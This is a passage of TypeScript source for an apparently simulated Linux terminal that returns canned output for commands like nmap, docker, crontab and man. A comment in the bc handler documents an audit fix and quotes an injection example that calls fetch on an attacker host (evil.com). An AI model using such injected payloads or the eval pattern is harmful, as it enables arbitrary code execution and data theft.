    if (!node) return `stat: cannot statx '${target}': No such file or directory`
    const abspath = this.resolveRealPath(target)
    return `  File: ${abspath}
  Size: ${node.size}          Blocks: ${Math.ceil(node.size / 512)}         IO Block: 4096   ${node.type === 'dir' ? 'directory' : 'regular file'}
Device: 8,1     Inode: ${Math.floor(Math.random() * 1000000)}  Links: ${node.type === 'dir' ? node.children.size + 2 : 1}
Access: (${modeStr(node.mode).slice(1)})  Uid: (${node.owner === 'root' ? '0' : '1000'}/${node.owner})   Gid: (${node.group === 'root' ? '0' : '1000'}/${node.group})
Access: ${new Date(node.mtime.getTime() - 3600000).toISOString().replace('T', ' ').slice(0, 19)}.000000000 +0000
Modify: ${node.mtime.toISOString().replace('T', ' ').slice(0, 19)}.000000000 +0000
Change: ${node.mtime.toISOString().replace('T', ' ').slice(0, 19)}.000000000 +0000
 Birth: ${new Date(node.mtime.getTime() - 86400000).toISOString().replace('T', ' ').slice(0, 19)}.000000000 +0000`
  }

  private cmdNmap(args: string[]): string {
    if (args.length === 0) return 'nmap: missing target\nUsage: nmap [scan type] [options] <target>'
    const target = args[args.length - 1]
    return `Starting Nmap 7.95 ( https://nmap.org ) at ${new Date().toISOString().split('T')[0]} 00:00 UTC
Nmap scan report for ${target} (192.168.1.${Math.floor(Math.random() * 254 + 1)})
Host is up (0.${String(Math.floor(Math.random() * 100)).padStart(3, '0')}s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds`
  }

  private cmdTcpdump(_args: string[]): string {
    return `tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:00:00.123456 IP 192.168.1.100.22 > 192.168.1.50.54321: Flags [P.], seq 1:45, ack 1, win 502, length 44
00:00:00.234567 IP 192.168.1.50.54321 > 192.168.1.100.22: Flags [.], ack 45, win 501, length 0
00:00:01.345678 IP 192.168.1.100.443 > 142.250.80.4.443: Flags [P.], seq 1:100, ack 1, win 502, length 99
00:00:01.456789 IP 142.250.80.4.443 > 192.168.1.100.443: Flags [.], ack 100, win 65535, length 0
tcpdump: 4 packets captured, 4 packets received by filter, 0 dropped by kernel`
  }

  private cmdAlias(args: string[], cmdLine: string): string {
    if (args.length === 0) {
      if (Object.keys(this.state.aliases).length === 0) return ''
      return Object.entries(this.state.aliases).map(([k, v]) => `alias ${k}='${v}'`).join('\n')
    }
    const eqMatch = cmdLine.match(/^alias\s+(\w+)=['"]?(.+?)['"]?$/)
    if (eqMatch) {
      this.state.aliases[eqMatch[1]] = eqMatch[2]
      return ''
    }
    const aliasName = args[0]
    if (this.state.aliases[aliasName]) {
      return `alias ${aliasName}='${this.state.aliases[aliasName]}'`
    }
    return `bash: alias: ${aliasName}: not found`
  }

  private cmdUnalias(args: string[]): string {
    if (args.length === 0) return 'unalias: usage: unalias [-a] name [name ...]'
    if (args[0] === '-a') {
      this.state.aliases = {}
      return ''
    }
    for (const name of args) {
      delete this.state.aliases[name]
    }
    return ''
  }

  private cmdExport(args: string[], cmdLine: string): string {
    if (args.length === 0) return this.cmdEnv()
    const eqMatch = cmdLine.match(/^export\s+(\w+)=['"]?(.+?)['"]?$/)
    if (eqMatch) {
      this.state.env[eqMatch[1]] = eqMatch[2]
      return ''
    }
    return ''
  }

  private cmdSource(args: string[]): string {
    if (args.length === 0) return 'source: missing file operand'
    const file = args[0]
    const content = this.readFile(file)
    if (content === null) return `bash: source: ${file}: No such file or directory`
    return `# sourced ${file}`
  }

  private cmdType(args: string[]): string {
    if (args.length === 0) return 'type: missing operand'
    const cmd = args[0]
    if (this.commandNames.includes(cmd)) return `${cmd} is a shell builtin`
    if (this.state.aliases[cmd]) return `${cmd} is aliased to \`${this.state.aliases[cmd]}'`
    return `bash: type: ${cmd}: not found`
  }

  private cmdCal(args: string[]): string {
    const now = new Date()
    const month = args.length > 0 ? parseInt(args[0]) - 1 : now.getMonth()
    const year = args.length > 1 ? parseInt(args[1]) : now.getFullYear()
    const months = ['January', 'February', 'March', 'April', 'May', 'June',
      'July', 'August', 'September', 'October', 'November', 'December']
    const daysInMonth = new Date(year, month + 1, 0).getDate()
    const firstDay = new Date(year, month, 1).getDay()

    const lines = [`     ${months[month]} ${year}`]
    lines.push('Su Mo Tu We Th Fr Sa')

    let week = ' '.repeat(firstDay * 3)
    for (let d = 1; d <= daysInMonth; d++) {
      week += String(d).padStart(2) + ' '
      if ((firstDay + d) % 7 === 0 || d === daysInMonth) {
        lines.push(week.trimEnd())
        week = ''
      }
    }
    return lines.join('\n')
  }

  private cmdBc(args: string[], pipeInput: string): string {
    if (args.length === 0 && !pipeInput) return 'bc: missing expression\nUse: echo "1+2" | bc'
    let expr = pipeInput || args.join(' ')
    expr = expr.replace(/\s/g, '')
    // 安全审计修复（发现 16，MEDIUM）：原实现 `new Function('return (' + expr + ')')()`
    // 等价于 eval，可执行任意 JS 代码（如 `1); fetch("http://evil.com",...)`）。
    // 现替换为安全的递归下降算术解析器，仅允许数字与 + - * / % ^ ( ) 运算符。
    try {
      const result = safeArithmeticEval(expr)
      return String(result)
    } catch (e) {
      return `bc: parse error near "${expr}" (${(e as Error).message})`
    }
  }

  private cmdSleep(args: string[]): string {
    if (args.length === 0) return 'sleep: missing operand'
    return `sleep: slept for ${args[0]} seconds (simulated)`
  }

  private cmdWatch(args: string[]): string {
    if (args.length === 0) return 'watch: missing command'
    const interval = args.includes('-n') ? args[args.indexOf('-n') + 1] : '2'
    const cmdStart = args.includes('-n') ? args.indexOf('-n') + 2 : 0
    const cmd = args.slice(cmdStart).join(' ')
    if (!cmd) return 'watch: missing command'
    return `Every ${interval}.0s: ${cmd}

${this.executeSingle(cmd, '')}`
  }

  private cmdPrintf(args: string[]): string {
    if (args.length === 0) return 'printf: missing format'
    const format = args[0].replace(/\\n/g, '\n').replace(/\\t/g, '\t')
    const vals = args.slice(1)
    let result = format
    for (let i = 0; i < vals.length; i++) {
      result = result.replace(/%[sd]/g, vals[i])
    }
    return result
  }

  private cmdSeq(args: string[]): string {
    if (args.length === 0) return 'seq: missing operand'
    const last = parseInt(args[0])
    if (isNaN(last)) return `seq: invalid number: ${args[0]}`
    const results: string[] = []
    for (let i = 1; i <= last; i++) {
      results.push(String(i))
    }
    return results.join('\n')
  }

  private cmdYes(args: string[]): string {
    const text = args.length > 0 ? args.join(' ') : 'y'
    const lines: string[] = []
    for (let i = 0; i < 20; i++) lines.push(text)
    return lines.join('\n')
  }

  private cmdBase64(args: string[], pipeInput: string): string {
    if (args.length === 0 && !pipeInput) return 'base64: missing operand'
    const input = pipeInput || args.join(' ')
    try {
      const encoded = btoa(input)
      return args.includes('-d') || args.includes('--decode')
        ? atob(input)
        : encoded
    } catch {
      return 'base64: invalid input'
    }
  }

  private cmdNeofetch(): string {
    const memTotal = 16384000
    const memUsed = 8192000
    const pkgs = 12
    const shell = 'bash 5.2.21'
    const de = 'NexTerm DE'
    const wm = 'NexTerm WM'
    const theme = 'NexTerm Dark [GTK2/3]'
    const icons = 'NexTerm [GTK2/3]'
    const terminal = 'NexTerm Terminal'
    const cpu = 'AMD Ryzen 7 5800X (8) @ 3.80GHz'
    const gpu = 'NVIDIA GeForce RTX 3060'

    const colorBar = '\x1b[40m   \x1b[41m   \x1b[42m   \x1b[43m   \x1b[44m   \x1b[45m   \x1b[46m   \x1b[47m   \x1b[0m'

    const logo = [
      `\x1b[1;34m      .--.      \x1b[0m`,
      `\x1b[1;34m     |o_o |     \x1b[0m`,
      `\x1b[1;34m     |:_/ |     \x1b[0m`,
      `\x1b[1;34m    //   \\ \\    \x1b[0m`,
      `\x1b[1;34m   (|     | )   \x1b[0m`,
      `\x1b[1;34m  /'\\_   _/\`\\  \x1b[0m`,
      `\x1b[1;34m  \\___)=(___/  \x1b[0m`,
    ]

    const info = [
      `\x1b[1;36m${this.state.username}\x1b[0m@\x1b[1;36m${this.state.hostname}\x1b[0m`,
      `\x1b[1;33m--------------\x1b[0m`,
      `\x1b[1;36mOS\x1b[0m: NexTerm Linux 1.0 x86_64`,
      `\x1b[1;36mHost\x1b[0m: NexTerm Virtual Machine`,
      `\x1b[1;36mKernel\x1b[0m: 6.1.0-nexterm`,
      `\x1b[1;36mUptime\x1b[0m: ${this.cmdUptime().split(',')[0]?.replace(/^\s+/, '') || 'up 1:00'}`,
      `\x1b[1;36mPackages\x1b[0m: ${pkgs} (dpkg)`,
      `\x1b[1;36mShell\x1b[0m: ${shell}`,
      `\x1b[1;36mResolution\x1b[0m: 1920x1080`,
      `\x1b[1;36mDE\x1b[0m: ${de}`,
      `\x1b[1;36mWM\x1b[0m: ${wm}`,
      `\x1b[1;36mTheme\x1b[0m: ${theme}`,
      `\x1b[1;36mIcons\x1b[0m: ${icons}`,
      `\x1b[1;36mTerminal\x1b[0m: ${terminal}`,
      `\x1b[1;36mCPU\x1b[0m: ${cpu}`,
      `\x1b[1;36mGPU\x1b[0m: ${gpu}`,
      `\x1b[1;36mMemory\x1b[0m: ${this.formatSize(memUsed * 1024)} / ${this.formatSize(memTotal * 1024)}`,
      ``,
      `   ${colorBar}`,
    ]

    const lines: string[] = []
    const maxLen = Math.max(logo.length, info.length)
    for (let i = 0; i < maxLen; i++) {
      const logoPart = i < logo.length ? logo[i] : ' '.repeat(24)
      const infoPart = i < info.length ? info[i] : ''
      lines.push(`${logoPart}  ${infoPart}`)
    }
    return lines.join('\n')
  }

  private cmdCrontab(args: string[]): string {
    if (args.includes('-l')) {
      return `# Edit this file to introduce tasks to be run by cron.
# m h  dom mon dow   command
0 6 * * * /usr/bin/apt update
0 2 * * 0 /usr/bin/apt upgrade -y
*/5 * * * * /usr/bin/echo "heartbeat" > /dev/null
30 4 * * 1 /home/user/backup.sh`
    }
    if (args.includes('-e')) {
      return `crontab: installing new crontab
crontab: changes saved`
    }
    if (args.includes('-r')) {
      return `crontab: removed crontab for ${this.state.username}`
    }
    if (args.length === 0) {
      return `crontab: usage error: file name or option required
Usage:
 crontab -l   list crontab
 crontab -e   edit crontab
 crontab -r   remove crontab`
    }
    return `crontab: usage error: unrecognized option`
  }

  private cmdDocker(args: string[]): string {
    if (args.length === 0) {
      return `Usage:  docker [OPTIONS] COMMAND

Management Commands:
  container   Manage containers
  image       Manage images
  network     Manage networks
  volume      Manage volumes

Commands:
  run         Create and run a new container
  ps          List containers
  images      List images
  pull        Pull an image from registry
  build       Build an image from a Dockerfile
  exec        Execute a command in a running container
  logs        Fetch the logs of a container
  stop        Stop one or more containers
  rm          Remove one or more containers
  rmi         Remove one or more images
  version     Show Docker version`
    }
    const sub = args[0]
    if (sub === 'ps' || sub === 'container' && args[1] === 'ls') {
      return `CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS        PORTS                    NAMES
a1b2c3d4e5f6   nginx:latest    "/docker-entrypoint.…"   2 hours ago    Up 2 hours    0.0.0.0:80->80/tcp       web-server
f6e5d4c3b2a1   mysql:8.0       "docker-entrypoint.s…"   3 hours ago    Up 3 hours    0.0.0.0:3306->3306/tcp   database
b2c3d4e5f6a7   redis:alpine    "docker-entrypoint.s…"   5 hours ago    Up 5 hours    0.0.0.0:6379->6379/tcp   cache`
    }
    if (sub === 'images') {
      return `REPOSITORY    TAG       IMAGE ID       CREATED        SIZE
nginx         latest    abc123def456   2 weeks ago    187MB
mysql         8.0       def456abc789   3 weeks ago    521MB
redis         alpine    ghi789jkl012   4 weeks ago    32.4MB
node          20-alpine jkl012mno345   1 week ago     118MB
python        3.12      mno345pqr678   2 weeks ago    1.02GB`
    }
    if (sub === 'version') {
      return `Client: Docker Engine - Community
 Version:           26.1.0
 API version:       1.45
 Go version:        go1.22.2
 Git commit:        abc1234
 Built:             Mon Jan 01 00:00:00 2024
 OS/Arch:           linux/amd64

Server: Docker Engine - Community
 Engine:
  Version:          26.1.0
  API version:      1.45 (minimum version 1.24)
  Go version:       go1.22.2
  Git commit:       def5678
  Built:            Mon Jan 01 00:00:00 2024
  OS/Arch:          linux/amd64`
    }
    if (sub === 'pull') {
      const image = args[1] || 'nginx'
      return `Using default tag: latest
latest: Pulling from library/${image}
Digest: sha256:${Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
Status: Downloaded newer image for ${image}:latest
docker.io/library/${image}:latest`
    }
    if (sub === 'run') {
      const imageIdx = args.findIndex(a => !a.startsWith('-') && a !== 'run')
      const image = imageIdx > 0 ? args[imageIdx] : 'nginx'
      return `Unable to find image '${image}:latest' locally
latest: Pulling from library/${image}
Status: Downloaded newer image for ${image}:latest
${Array(8).fill(0).map(() => Math.random().toString(36).substring(2, 14)).join('')}`
    }
    return `docker: '${sub}' is not a docker command.`
  }

  private cmdMount(args: string[]): string {
    if (args.length === 0) {
      return `sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=8192000k)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=1638400k)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
/dev/sdb1 on /data type ext4 (rw,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)`
    }
    return `mount: ${args[0]}: mount point does not exist.`
  }

  private cmdUmount(args: string[]): string {
    if (args.length === 0) return 'umount: missing mount point'
    return `umount: ${args[0]}: unmounted successfully.`
  }

  private cmdShutdown(args: string[]): string {
    const now = args.includes('now') || args.includes('-h') || args.includes('0')
    if (now) {
      return `Shutdown scheduled for now, use 'shutdown -c' to cancel.

Broadcast message from ${this.state.username}@${this.state.hostname}:
The system is going down for poweroff NOW!`
    }
    if (args.includes('-r')) {
      return `Reboot scheduled for now.

Broadcast message from ${this.state.username}@${this.state.hostname}:
The system is going down for reboot NOW!`
    }
    if (args.includes('-c')) {
      return `Shutdown cancelled.`
    }
    return `Usage: shutdown [-h] [-r] [-c] [time]
  -h    Power off the machine
  -r    Reboot the machine
  -c    Cancel a pending shutdown`
  }

  private cmdReboot(_args: string[]): string {
    return `Rebooting...

System is rebooting. All processes will be terminated.
Connection to ${this.state.hostname} closed.`
  }

  private cmdHostnamectl(args: string[]): string {
    if (args.length === 0 || args[0] === 'status') {
      return `   Static hostname: ${this.state.hostname}
         Icon name: computer-vm
           Chassis: vm
        Machine ID: ${Array(32).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
           Boot ID: ${Array(32).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
    Virtualization: kvm
  Operating System: NexTerm Linux 1.0
            Kernel: Linux 6.1.0-nexterm
      Architecture: x86-64`
    }
    if (args[0] === 'set-hostname') {
      const name = args[1]
      if (!name) return 'hostnamectl: missing hostname'
      this.state.hostname = name
      this.state.env.HOSTNAME = name
      return `Hostname set to '${name}'`
    }
    return `hostnamectl: unknown command "${args[0]}"`
  }

  private cmdMan(cmd: string): string {
    const pages: Record<string, string> = {
      ls: `LS(1)  User Commands  LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List information about the FILEs (the current directory by default).
       -a    do not ignore entries starting with .
       -l    use a long listing format
       -la   combine -l and -a`,
      cd: `CD(1)  User Commands  CD(1)

NAME
       cd - change the working directory

SYNOPSIS
       cd [dir]

DESCRIPTION
       Change the current directory to dir. If dir is not supplied,
       the value of the HOME shell variable is used.
       Use 'cd -' to return to the previous directory.`,
      grep: `GREP(1)  User Commands  GREP(1)

NAME
       grep - print lines that match patterns

SYNOPSIS
       grep [OPTION]... PATTERNS [FILE]...

DESCRIPTION
       Search for PATTERNS in each FILE.
       -i    ignore case distinctions
       -n    print line number with output lines`,
      ps: `PS(1)  User Commands  PS(1)

NAME
       ps - report a snapshot of the current processes

SYNOPSIS
       ps [OPTIONS]

DESCRIPTION
       ps displays information about a selection of the active processes.
       aux   show processes for all users with detailed info`,
      ping: `PING(8)  System Manager's Manual  PING(8)

NAME
       ping - send ICMP ECHO_REQUEST to network hosts

SYNOPSIS
       ping [OPTIONS] destination

DESCRIPTION
       Use ICMP mandatory ECHO_REQUEST datagrams to elicit an ICMP
       ECHO_RESPONSE from a host or gateway.`,
      apt: `APT(8)  APT  APT(8)

NAME
       apt - command-line interface for the package management system

SYNOPSIS
       apt [command] [options]

DESCRIPTION
       apt provides a high-level commandline interface for the package
       management system. Commands:
       update    - update list of available packages
       install   - install packages
       remove    - remove packages
       search    - search for packages
       list      - list packages`,
      systemctl: `SYSTEMCTL(1)  systemctl  SYSTEMCTL(1)

NAME
       systemctl - Control the systemd system and service manager

SYNOPSIS
       systemctl [OPTIONS...] COMMAND [UNIT...]

DESCRIPTION
       systemctl may be used to introspect and control the state of the
       systemd system and service manager.
       status    - show status of service
       list-units - list loaded units`,
      tar: `TAR(1)  GNU TAR  TAR(1)

NAME
       tar - an archiving utility

SYNOPSIS
       tar [OPTIONS] [FILE]...

DESCRIPTION
       GNU tar is an archiving program designed to store multiple files in
       a single file (an archive), and to manipulate such archives.
       -czf   create gzipped archive
       -xzf   extract gzipped archive
       -tf    list archive contents`,
      kill: `KILL(1)  User Commands  KILL(1)

NAME
       kill - send a signal to a process

SYNOPSIS
       kill [options] <pid> [...]

DESCRIPTION
       The kill command sends a signal to processes.
       -9, -SIGKILL   force kill (cannot be caught or ignored)`,
      docker: `DOCKER(1)  Docker  DOCKER(1)

NAME
       docker - Docker image and container command line interface

SYNOPSIS
       docker [OPTIONS] COMMAND [ARG...]

DESCRIPTION
       docker is a command line client for managing Docker containers
       and images.
       ps      - list running containers
       images  - list available images
       pull    - pull an image from registry
       run     - run a container
       version - show Docker version`,
      neofetch: `NEOFETCH(1)  User Commands  NEOFETCH(1)

NAME
       neofetch - display system information in a visually appealing way

SYNOPSIS
       neofetch

DESCRIPTION
       Neofetch displays information about the operating system, software
       and hardware in a visually appealing way. It is commonly used in
       Kali Linux and Ubuntu to show system info in terminal screenshots.`,
      crontab: `CRONTAB(1)  User Commands  CRONTAB(1)

NAME
       crontab - maintain crontab files for individual users

SYNOPSIS
       crontab [-l] [-e] [-r]

DESCRIPTION
       crontab is the program used to install, remove or list the tables
       used to drive the cron daemon.
       -l    display the current crontab
       -e    edit the current crontab
       -r    remove the current crontab`,
      mount: `MOUNT(8)  System Manager's Manual  MOUNT(8)

NAME
       mount - mount a filesystem

SYNOPSIS
       mount [-l] [-t type] device dir

DESCRIPTION
       mount serves to attach the filesystem found on some device to the
       file tree. Without arguments, all mounted filesystems are listed.`,
      shutdown: `SHUTDOWN(8)  System Manager's Manual  SHUTDOWN(8)

NAME
       shutdown - Halt, power-off or reboot the machine

SYNOPSIS
       shutdown [OPTIONS...] [TIME] [WALL...]

DESCRIPTION
       shutdown may be used to halt, power-off or reboot the machine.
       -h    Power off the machine
       -r    Reboot the machine
       -c    Cancel a pending shutdown`,
    }
    if (pages[cmd]) return pages[cmd]
    return `No manual entry for ${cmd}`
  }
}

export function formatColoredOutput(text: string): { text: string; isColor: boolean }[] {
  const parts: { text: string; isColor: boolean }[] = []
  const regex = /\x1b\[([\d;]+)m/g
  let lastIndex = 0
  let match: RegExpExecArray | null
  while ((match = regex.exec(text)) !== null) {
    if (match.index > lastIndex) {
      parts.push({ text: text.slice(lastIndex, match.index), isColor: false })
    }
    parts.push({ text: `\x1b[${match[1]}m`, isColor: true })
    lastIndex = regex.lastIndex
  }
  if (lastIndex < text.length) {
    parts.push({ text: text.slice(lastIndex), isColor: false })
  }
  return parts
}